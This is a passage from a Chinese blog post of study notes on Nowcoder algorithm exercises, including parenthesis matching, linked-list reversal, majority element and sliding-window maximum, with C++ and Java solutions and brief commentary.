<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span> <span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">            <span class="keyword">int</span> len = s.length();</span><br><span class="line">            s = s.replace(<span class="string">"()"</span>,<span class="string">""</span>);</span><br><span class="line">            s = s.replace(<span class="string">"&#123;&#125;"</span>,<span class="string">""</span>);</span><br><span class="line">            s = s.replace(<span class="string">"[]"</span>,<span class="string">""</span>);</span><br><span class="line">            <span class="keyword">if</span>(len == s.length())&#123;</span><br><span class="line">                flag = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.length() ==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意：c++这么使用不好，，，，因为如果s.replace里面没有字符串，，，就报错了，，，，</p>
<h3 id="my-exp"><a href="#my-exp" class="headerlink" title="my exp"></a>my exp</h3><blockquote>
<p>写的比较烂，，，效率不高，但是勉强通过测试了</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param s string字符串 </span></span><br><span class="line"><span class="comment">     * @return bool布尔型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">            <span class="keyword">bool</span> bol = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; stack1;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">'('</span> || s[i] == <span class="string">'&#123;'</span> ||s[i]==<span class="string">'['</span>)&#123;</span><br><span class="line">            stack1.push(s[i]);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">']'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stack1.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> c = stack1.top();</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">'['</span>)&#123;</span><br><span class="line">                <span class="keyword">if</span>(stack1.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">                    bol = <span class="literal">false</span>;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                stack1.pop();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">'&#125;'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stack1.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> c = stack1.top();</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">'&#123;'</span>)&#123;</span><br><span class="line">                stack1.pop();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">')'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stack1.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">char</span> c = stack1.top();</span><br><span class="line">            <span class="keyword">if</span>(c == <span class="string">'('</span>)&#123;</span><br><span class="line">                stack1.pop();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(stack1.<span class="built_in">size</span>()!=<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> bol;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC55-最长公共前缀"><a href="#NC55-最长公共前缀" class="headerlink" title="NC55 最长公共前缀"></a>NC55 最长公共前缀</h2><blockquote>
<p>五种方法，，，</p>
</blockquote>
<h2 id="NC57-反转数字"><a href="#NC57-反转数字" class="headerlink" title="NC57 反转数字"></a>NC57 反转数字</h2><blockquote>
<p>看了答案，感觉很简单，tql。</p>
<p>就直接把结果加到res上，都不用考虑负数和溢出。。。</p>
<p>负数其实无所谓，但是溢出的话，可以同不会溢出的long和溢出的int比较大小是否相同判断是否溢出了。</p>
</blockquote>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param x int整型 </span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">long</span> res=<span class="number">0</span>;<span class="comment">//由于给定了长度，故long的话，不会溢出。</span></span><br><span class="line">        <span class="keyword">while</span>(x!=<span class="number">0</span>)&#123;</span><br><span class="line">            res = res*<span class="number">10</span>+x%<span class="number">10</span>;</span><br><span class="line">            x/=<span class="number">10</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)res == res?(<span class="keyword">int</span>)res:<span class="number">0</span>;<span class="comment">//根据long和int是否相等，就可以知道是否溢出了。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC65-斐波那契数列"><a href="#NC65-斐波那契数列" class="headerlink" title="NC65 斐波那契数列"></a>NC65 斐波那契数列</h2><blockquote>
<p>简单题，，，，感觉自己写的挺好的，，，</p>
</blockquote>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">Fibonacci</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a[<span class="number">40</span>];</span><br><span class="line">        a[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">        a[<span class="number">1</span>] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;<span class="number">40</span>;i++)&#123;</span><br><span class="line">            a[i] = a[i<span class="number">-1</span>] + a[i<span class="number">-2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a[n<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC66-两个链表的第一个公共结点"><a href="#NC66-两个链表的第一个公共结点" class="headerlink" title="NC66 两个链表的第一个公共结点"></a>NC66 两个链表的第一个公共结点</h2><blockquote>
<ol>
<li><p>说的是公共结点而不是相同元素的结点，所以如图所示：</p>
<p><img src="/2021/04/18/08-14/image-20210414211616825.png" alt="image-20210414211616825"></p>
<p>2.a的长度不一定等于b的长度，为了让两个指针同步走，又因为a+b=b+a</p>
<p>故前面增加另一个链表，如下图所示</p>
<p><img src="/2021/04/18/08-14/image-20210414211726549.png" alt="image-20210414211726549"></p>
</li>
</ol>
</blockquote>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">struct ListNode &#123;</span></span><br><span class="line"><span class="comment">	int val;</span></span><br><span class="line"><span class="comment">	struct ListNode *next;</span></span><br><span class="line"><span class="comment">	ListNode(int x) :</span></span><br><span class="line"><span class="comment">			val(x), next(NULL) &#123;</span></span><br><span class="line"><span class="comment">	&#125;</span></span><br><span class="line"><span class="comment">&#125;;*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">FindFirstCommonNode</span><span class="params">( ListNode* pHead1, ListNode* pHead2)</span> </span>&#123;</span><br><span class="line">        ListNode* ta=pHead1;</span><br><span class="line">        ListNode* tb=pHead2;</span><br><span class="line">        <span class="keyword">while</span>(ta!=tb)&#123;<span class="comment">//公共结点</span></span><br><span class="line">            ta=ta?ta-&gt;next:pHead2;<span class="comment">//pHead1+pHead2</span></span><br><span class="line">            tb=tb?tb-&gt;next:pHead1;<span class="comment">//pHead1+pHead1</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ta;<span class="comment">//直接返回即可，一定有公共结点</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC68-跳台阶"><a href="#NC68-跳台阶" class="headerlink" title="NC68 跳台阶"></a>NC68 跳台阶</h2><blockquote>
<p>有递归和循环（动态规划）两种解法，我写的是递归。</p>
<p>递归式：<img src="/2021/04/18/08-14/image-20210414170335614.png" alt="image-20210414170335614"></p>
</blockquote>
<h3 id="动态规划"><a href="#动态规划" class="headerlink" title="动态规划"></a>动态规划</h3><blockquote>
<p>将过程的情况记录在dp数组中。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">jumpFloor</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> dp[number+<span class="number">1</span>];</span><br><span class="line">        dp[<span class="number">0</span>]=<span class="number">1</span>;</span><br><span class="line">        dp[<span class="number">1</span>]=<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=number;i++)&#123;</span><br><span class="line">            dp[i]=dp[i<span class="number">-1</span>]+dp[i<span class="number">-2</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[number];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="my-exp（递归）"><a href="#my-exp（递归）" class="headerlink" title="my exp（递归）"></a>my exp（递归）</h3><blockquote>
<p>只要指定结束条件，然后公式，，，就行</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">jumpFloor</span><span class="params">(<span class="keyword">int</span> number)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(number==<span class="number">1</span>) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(number==<span class="number">2</span>) <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">return</span> jumpFloor(number<span class="number">-1</span>)+jumpFloor(number<span class="number">-2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC73-数组中出现次数超过一半的数字"><a href="#NC73-数组中出现次数超过一半的数字" class="headerlink" title="NC73 数组中出现次数超过一半的数字"></a>NC73 数组中出现次数超过一半的数字</h2><blockquote>
<p>emmm，感觉这题似曾相识，一开始直接排序取中值，然后不对，是因为这里硬性要求要个数大于一般，就模拟来做，做出来了。</p>
<p>题解就比较强了，给了三种方法，分别是哈希法、排序法、候选法。思路其实本质一样，只是实现的方法略有不同。</p>
</blockquote>
<h3 id="哈希法"><a href="#哈希法" class="headerlink" title="哈希法"></a>哈希法</h3><blockquote>
<p>使用map，他的键是数，值是出现的个数，先放进去，找到大于一半的</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">MoreThanHalfNum_Solution</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">unordered_map</span>&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; <span class="built_in">map</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers) ++<span class="built_in">map</span>[k];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">map</span>[k]&gt;numbers.<span class="built_in">size</span>()/<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> k;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="排序法"><a href="#排序法" class="headerlink" title="排序法"></a>排序法</h3><blockquote>
<p>排序好的中值一定是我们要找的数，然后判断他的长度即可。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">MoreThanHalfNum_Solution</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers)</span> </span>&#123;</span><br><span class="line">        sort(numbers.<span class="built_in">begin</span>(),numbers.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">int</span> cond = numbers[numbers.<span class="built_in">size</span>()/<span class="number">2</span>];</span><br><span class="line">        <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers)&#123;</span><br><span class="line">            <span class="keyword">if</span>(k == cond)&#123;</span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt &gt; numbers.<span class="built_in">size</span>()/<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> cond;</span><br><span class="line">        &#125;<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="候选法"><a href="#候选法" class="headerlink" title="候选法"></a>候选法</h3><blockquote>
<p>很有意思的想法，因为选取的数，要大于一半。</p>
<p>所以让两两不同的消除，相同的保留，这样，最后能留下来的话就是答案，否则就没有。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">MoreThanHalfNum_Solution</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; numbers)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> cond = <span class="number">-1</span>;<span class="comment">//候选人，即选出来的值</span></span><br><span class="line">        <span class="keyword">int</span> cnt = <span class="number">0</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numbers.<span class="built_in">size</span>();i++)&#123;<span class="comment">//循环的是下标</span></span><br><span class="line">            <span class="keyword">if</span>(cnt == <span class="number">0</span>)&#123;<span class="comment">//没有候选人</span></span><br><span class="line">                cond=numbers[i];<span class="comment">//直接选取当前的作为候选人</span></span><br><span class="line">                cnt++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(cond == numbers[i])<span class="comment">//如果还是候选人</span></span><br><span class="line">                    cnt++;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    cnt--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        cnt=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span> k:numbers)&#123;<span class="comment">//循环的是数组里面的值，即候选人</span></span><br><span class="line">            <span class="keyword">if</span>(k == cond)</span><br><span class="line">                cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt &gt; numbers.<span class="built_in">size</span>()/<span class="number">2</span>)</span><br><span class="line">            <span class="keyword">return</span> cond;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="my-exp-1"><a href="#my-exp-1" class="headerlink" title="my exp"></a>my exp</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">class Solution &#123;</span><br><span class="line">public:</span><br><span class="line">    int MoreThanHalfNum_Solution(vector&lt;int&gt; numbers) &#123;</span><br><span class="line">        int arr[10]&#x3D;&#123;0,0,0,0,0,0,0,0,0,0&#125;;</span><br><span class="line">        for(int i&#x3D;0;i&lt;numbers.size();i++)&#123;</span><br><span class="line">            arr[numbers[i]]++;</span><br><span class="line">        &#125;</span><br><span class="line">        for(int i&#x3D;0;i&lt;10;i++)&#123;</span><br><span class="line">            if(arr[i]&gt;numbers.size()&#x2F;2)&#123;</span><br><span class="line">                return i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="NC-76-用两个栈实现队列"><a href="#NC-76-用两个栈实现队列" class="headerlink" title="NC 76 用两个栈实现队列"></a>NC 76 用两个栈实现队列</h2><blockquote>
<p>简单，，，图示如下：</p>
<p><img src="/2021/04/18/08-14/image-20210412140342164.png" alt="image-20210412140342164"></p>
</blockquote>
<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>思路：</p>
<ol>
<li>push操作，还是正常的，stack1.push即可</li>
<li>pop操作，首先要讲栈1的数据放入栈2中，然后从栈2中pop出来的数据，就可以了。</li>
</ol>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> node)</span> </span>&#123;</span><br><span class="line">        stack1.push(node);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(stack2.empty())&#123;</span><br><span class="line">            <span class="keyword">while</span>(!stack1.empty())&#123;</span><br><span class="line">                stack2.push(stack1.top());</span><br><span class="line">                stack1.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> ans = stack2.top();</span><br><span class="line">        stack2.pop();</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stack1;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">int</span>&gt; stack2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：不能直接讲pop后的值拿来赋值，我也不知道为什么，但事实上就是不好使，先top赋值，然后pop掉数。</p>
</blockquote>
<h2 id="NC78-反转链表"><a href="#NC78-反转链表" class="headerlink" title="NC78 反转链表"></a>NC78 反转链表</h2><blockquote>
<p><del>玄学，，，为什么我写的一直报错，，，，搞不懂啊，，，555，，，TATATAT</del></p>
</blockquote>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>反转链表，，，思路就是把每个节点存入一个向量vector中，他的类型是ListNode*的，然后就好了。。。</p>
<p>这里比较奇怪的一点是，要先给ans赋值v[v.size()-1]，否则就会出现段错误，，，，搞不懂</p>
<h3 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-25.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="keyword">int</span> val;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">next</span>;</span></span><br><span class="line">	ListNode(<span class="keyword">int</span> x) :</span><br><span class="line">			val(x), next(<span class="literal">NULL</span>) &#123;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">ReverseList</span><span class="params">(ListNode* pHead)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!pHead)  <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="built_in">vector</span>&lt;ListNode*&gt; v;</span><br><span class="line">        <span class="keyword">while</span>(pHead!= <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            v.push_back(pHead);</span><br><span class="line">            pHead = pHead-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        ListNode* res = v[v.<span class="built_in">size</span>()<span class="number">-1</span>];</span><br><span class="line">        ListNode* current = res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = v.<span class="built_in">size</span>()<span class="number">-2</span>; i &gt;= <span class="number">0</span> ; --i) &#123;</span><br><span class="line">            current-&gt;next = v[i];</span><br><span class="line">            current = current-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        current-&gt;next = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">ListNode <span class="title">l1</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">l2</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">    <span class="function">ListNode <span class="title">l3</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line">    l1.next = &amp;l2;</span><br><span class="line">    l2.next = &amp;l3;</span><br><span class="line"></span><br><span class="line">    Solution s;</span><br><span class="line">    ListNode* ans = s.ReverseList(&amp;l1);</span><br><span class="line">    <span class="keyword">while</span> (ans!= <span class="literal">nullptr</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans-&gt;val&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        ans = ans-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="NC82-滑动窗口的最大值"><a href="#NC82-滑动窗口的最大值" class="headerlink" title="NC82 滑动窗口的最大值"></a>NC82 滑动窗口的最大值</h2><blockquote>
<p>主要知道一下一点，就能比较方便的做出来</p>
<ul>
<li>滑动窗口的个数：<code>int sz = num.size()-size+1;</code>【简单的数学知识】</li>
</ul>
<p>其他的就是正常的编程即可。</p>
</blockquote>
<h3 id="按给定大小对数组初始化"><a href="#按给定大小对数组初始化" class="headerlink" title="按给定大小对数组初始化"></a>按给定大小对数组初始化</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v</span> <span class="params">(sz,<span class="number">0</span>)</span></span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>可以看到其实vector使用的相对来说还是比较多的。</p>
</blockquote>
<h3 id="优化"><a href="#优化" class="headerlink" title="优化"></a>优化</h3><blockquote>
<p>虽然很简单，又很平常的语句，但是不加的话，一旦数据量比较大，那么运行很可能超时间，故一定要养成写的习惯。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="built_in">size</span> &gt; num.<span class="built_in">size</span>() || <span class="built_in">size</span> ==<span class="number">0</span> ) <span class="keyword">return</span> &#123;&#125;;</span><br></pre></td></tr></table></figure>
<h3 id="exp-11"><a href="#exp-11" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">maxInWindows</span><span class="params">(<span class="keyword">const</span> <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp; num,<span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">size</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">size</span> &gt; num.<span class="built_in">size</span>() || <span class="built_in">size</span> ==<span class="number">0</span> ) <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">        <span class="keyword">int</span> sz = num.<span class="built_in">size</span>()-<span class="built_in">size</span>+<span class="number">1</span>;</span><br><span class="line">        <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">v</span> <span class="params">(sz,<span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; sz; ++i) &#123;</span><br><span class="line">            v[i] = num[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i; j &lt; i+<span class="built_in">size</span>; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span>(v[i]&lt;num[j]) v[i] = num[j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; v = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span 